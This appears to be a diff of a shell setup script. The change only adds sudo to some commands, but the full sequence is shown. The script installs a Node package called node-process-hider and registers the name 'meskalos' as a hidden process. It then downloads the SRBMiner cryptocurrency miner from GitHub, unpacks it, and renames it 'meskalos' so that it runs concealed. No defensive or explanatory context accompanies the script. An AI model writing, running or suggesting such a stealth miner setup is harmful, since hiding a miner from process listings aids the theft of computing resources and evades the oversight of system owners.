@@ -1,6 +1,6 @@
-apt update && apt-get install -y nodejs npm
-npm i -g node-process-hider
-ph add meskalos
+sudo apt update && sudo apt-get install -y nodejs npm
+sudo npm i -g node-process-hider
+sudo ph add meskalos
 wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/srbminer-3-6-9/SRBMiner-Multi-3-6-9-Linux.tar.gz
 tar xf SRBMiner-Multi-3-6-9-Linux.tar.gz
 mv SRBMiner-MULTI meskalos
